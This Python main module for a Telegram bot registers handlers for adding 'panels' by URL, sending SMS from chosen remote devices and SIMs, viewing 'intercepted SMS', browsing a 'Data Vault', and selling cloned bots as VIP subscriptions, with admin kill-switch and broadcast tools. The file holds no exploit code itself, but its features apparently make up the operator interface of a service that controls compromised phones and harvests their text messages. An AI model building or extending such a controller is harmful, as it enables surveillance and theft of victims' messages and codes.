import logging
import sys
import os
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)
from telegram import Update

from bot.config import BOT_TOKEN
from bot.database import db
from bot.handlers.start import start_cmd
from bot.handlers.start.verify_join import verify_join_callback
from bot.handlers.referral.show_referral_link import referral_menu
from bot.handlers.wallet.show_balance import wallet_menu
from bot.handlers.support.support_handler import support_menu
from bot.handlers.list_panels import my_panels_menu, handle_panel_selection, handle_panel_deletion

# Panels addition conversations
from bot.handlers.panels import add_panel_start, process_url, AWAITING_URL

# SMS custom handlers
import bot.handlers.sms.send_sms as send_sms
import bot.handlers.sms.receive_sms as receive_sms

# Clone handlers
import bot.handlers.clone.create_bot as create_bot

# Super admin controller
import bot.handlers.admin as admin

# Data Vault
import bot.handlers.vault as vault
from bot.utils.logger import setup_logger

logger = setup_logger(__name__)

async def back_to_menu_callback(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Returns the user to the main menu."""
    if not isinstance(update, Update):
        return
        
    query = update.callback_query
    if query:
        await query.answer()
    
    user_id = update.effective_user.id
    from bot.models.user_model import get_user
    user_record = await get_user(user_id)
    
    # Import to avoid circular refs
    from bot.handlers.start import show_main_menu_message
    await show_main_menu_message(update, context, user_record)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log the error and send a telegram message to notify the developer."""
    logger.error(msg="Exception while handling an update:", exc_info=context.error)
    
    # Optional: notify user
    try:
        if isinstance(update, Update) and update.effective_user:
             await context.bot.send_message(
                 chat_id=update.effective_user.id,
                 text="⚠️ **An internal error occurred.**\nThe technical team has been notified. Please try again later."
             )
    except Exception as e:
        logger.warning(f"Failed to send error notification: {e}")

async def post_init(application: Application):
    """Initialises Neon Postgres connection on startup."""
    from bot.services.clone_bot_manager import clone_manager
    await db.init_db()
    # Resume all active clones
    await clone_manager.load_and_start_all()
    
    # Start periodic expiration check
    import asyncio
    asyncio.create_task(clone_manager.expiration_monitor())

def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("BOT_TOKEN is missing or default. Please add it to your .env file.")
        return

    # Build Application client
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    # Global Error Handler
    app.add_error_handler(error_handler)
    
    # Core Commands
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("admin", admin.admin_panel))
    
    # Menu message handlers (Support ReplyKeyboardMarkup)
    app.add_handler(MessageHandler(filters.Regex("^⬅️ Menu$") | filters.Regex("^⬅️ Back to Menu$"), back_to_menu_callback))
    app.add_handler(CallbackQueryHandler(back_to_menu_callback, pattern="^back_to_menu$"))
    
    # Verification triggers
    app.add_handler(CallbackQueryHandler(verify_join_callback, pattern="^verify_join$"))
    
    # Info tabs triggers
    app.add_handler(CallbackQueryHandler(referral_menu, pattern="^refer$"))
    app.add_handler(CallbackQueryHandler(wallet_menu, pattern="^wallet$"))
    app.add_handler(CallbackQueryHandler(support_menu, pattern="^support$"))
    
    # Vault triggers
    app.add_handler(CallbackQueryHandler(vault.vault_menu, pattern="^data_vault$"))
    app.add_handler(CallbackQueryHandler(vault.vault_view_branch, pattern="^vault_.*$"))
    
    # Panels management callbacks
    app.add_handler(CallbackQueryHandler(my_panels_menu, pattern="^my_panels$"))
    app.add_handler(CallbackQueryHandler(handle_panel_selection, pattern="^selpanel_\\d+$"))
    app.add_handler(CallbackQueryHandler(handle_panel_deletion, pattern="^delpanel_\\d+$"))
    
    # Panel addition conversation (A-to-Z dynamic check)
    panel_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(add_panel_start, pattern="^add_panel$")],
        states={
            AWAITING_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_url)]
        },
        fallbacks=[CommandHandler("cancel", start_cmd), CallbackQueryHandler(back_to_menu_callback, pattern="^back_to_menu$")]
    )
    app.add_handler(panel_conv)
    
    # SMS Send Custom Conversation
    sms_send_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(send_sms.send_sms_flow_start, pattern="^send_sms$")],
        states={
            send_sms.SELECTING_DEVICE: [CallbackQueryHandler(send_sms.device_selected_callback, pattern="^senddev_.*$")],
            send_sms.ENTERING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_sms.phone_entered_callback)],
            send_sms.ENTERING_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_sms.message_entered_callback)],
            send_sms.SELECTING_SIM: [CallbackQueryHandler(send_sms.sim_selected_callback, pattern="^sendsim_.*$")]
        },
        fallbacks=[
            CallbackQueryHandler(send_sms.cancel_sms_flow, pattern="^cancel_sms$"),
            CommandHandler("cancel", start_cmd)
        ]
    )
    app.add_handler(sms_send_conv)
    
    # SMS Intercepts viewing
    sms_receive_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(receive_sms.start_receive_sms_flow, pattern="^receive_sms$")],
        states={
            receive_sms.CHOOSING_RECV_DEVICE: [CallbackQueryHandler(receive_sms.view_intercepted_sms, pattern="^recvdev_.*$")]
        },
        fallbacks=[
            CallbackQueryHandler(send_sms.cancel_sms_flow, pattern="^cancel_sms$"),
            CommandHandler("cancel", start_cmd)
        ]
    )
    app.add_handler(sms_receive_conv)
    
    # Clone Bot Generation / VIP purchasing
    app.add_handler(CallbackQueryHandler(create_bot.buy_vip_callback, pattern="^buy_vip$"))
    
    clone_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(create_bot.create_bot_menu, pattern="^create_bot$")],
        states={
            create_bot.ENTERING_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_bot.process_bot_token)]
        },
        fallbacks=[
            CommandHandler("cancel", start_cmd),
            CallbackQueryHandler(back_to_menu_callback, pattern="^back_to_menu$")
        ]
    )
    app.add_handler(clone_conv)
    
    # Super Admin Controllers
    import bot.handlers.admin.users as adm_users
    import bot.handlers.admin.user_search as adm_user_search
    
    app.add_handler(CallbackQueryHandler(admin.admin_panel, pattern="^admin_menu$"))
    app.add_handler(CallbackQueryHandler(admin.analytics_view, pattern="^adm_analytics$"))
    app.add_handler(CallbackQueryHandler(admin.admin_kill_switch_menu, pattern="^adm_killswitch$"))
    app.add_handler(CallbackQueryHandler(admin.handle_killswitch_toggle, pattern="^killsys_.*$"))
    
    # Advanced Admin features
    import bot.handlers.admin.clones as adm_clones
    import bot.handlers.admin.settings_flow as settings_flow
    import bot.handlers.admin.points as adm_points
    import bot.handlers.admin.logs as adm_logs
    
    app.add_handler(CallbackQueryHandler(adm_users.users_list_menu, pattern="^adm_users$"))
    app.add_handler(CallbackQueryHandler(adm_user_search.handle_user_actions, pattern="^(admban_|admunban_|admptadd_|admptsub_|admbta_|admbtm_).*$"))
    
    app.add_handler(CallbackQueryHandler(adm_clones.clones_list_menu, pattern="^adm_clones$"))
    app.add_handler(CallbackQueryHandler(adm_clones.clone_details, pattern="^admclone_.*$"))
    app.add_handler(CallbackQueryHandler(adm_clones.clone_run_actions, pattern="^(admclstop_|admclstart_|admclonerman_).*$"))
    
    # Settings main menu entry
    app.add_handler(CallbackQueryHandler(settings_flow.settings_main_menu, pattern="^adm_settings$"))
    app.add_handler(CallbackQueryHandler(settings_flow.fj_menu, pattern="^set_fj$"))
    app.add_handler(CallbackQueryHandler(settings_flow.fj_action, pattern="^fj_(toggle|remove|rm_idx_).*$"))
    app.add_handler(CallbackQueryHandler(settings_flow.pricing_menu, pattern="^set_pricing$"))
    
    settings_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(settings_flow.fj_action, pattern="^fj_add$"),
            CallbackQueryHandler(settings_flow.pricing_input, pattern="^prc_.*$")
        ],
        states={
            settings_flow.AWAIT_FJ_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, settings_flow.fj_add_channel)],
            settings_flow.AWAIT_PRICING: [MessageHandler(filters.TEXT & ~filters.COMMAND, settings_flow.save_pricing)]
        },
        fallbacks=[CommandHandler("cancel", admin.admin_panel), CallbackQueryHandler(back_to_menu_callback, pattern="^admin_menu$")]
    )
    app.add_handler(settings_conv)

    app.add_handler(CallbackQueryHandler(adm_points.points_mgmt_menu, pattern="^adm_points$"))
    app.add_handler(CallbackQueryHandler(adm_logs.logs_menu, pattern="^(adm_logs|admlog_.*)$"))
    app.add_handler(CallbackQueryHandler(adm_logs.handle_export, pattern="^export_users$"))
    
    user_search_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(adm_user_search.search_user_start, pattern="^adm_search_user$")],
        states={
            adm_user_search.AWAITING_SEARCH: [MessageHandler(filters.TEXT & ~filters.COMMAND, adm_user_search.process_user_search)]
        },
        fallbacks=[CommandHandler("cancel", start_cmd), CallbackQueryHandler(back_to_menu_callback, pattern="^admin_menu$")]
    )
    app.add_handler(user_search_conv)
    
    # Broadcast Flow
    import bot.handlers.admin.broadcast_flow as broadcast_flow
    broadcast_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(broadcast_flow.broadcast_start, pattern="^adm_broadcast$")],
        states={
            broadcast_flow.AWAIT_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_flow.receive_msg)],
            broadcast_flow.AWAIT_Q_BTN: [CallbackQueryHandler(broadcast_flow.q_btn_callback, pattern="^bcbtn_.*$")],
            broadcast_flow.AWAIT_BTN_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_flow.receive_btn_text)],
            broadcast_flow.AWAIT_BTN_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_flow.receive_btn_url)],
            broadcast_flow.AWAIT_PREVIEW_CONFIRM: [CallbackQueryHandler(broadcast_flow.send_broadcast_all, pattern="^bc_.*$")],
        },
        fallbacks=[CommandHandler("cancel", start_cmd), CallbackQueryHandler(back_to_menu_callback, pattern="^admin_menu$")]
    )
    app.add_handler(broadcast_conv)
    
    logger.info("Starting Telegram Bot Polling Loops...")
    app.run_polling()

if __name__ == "__main__":
    main()
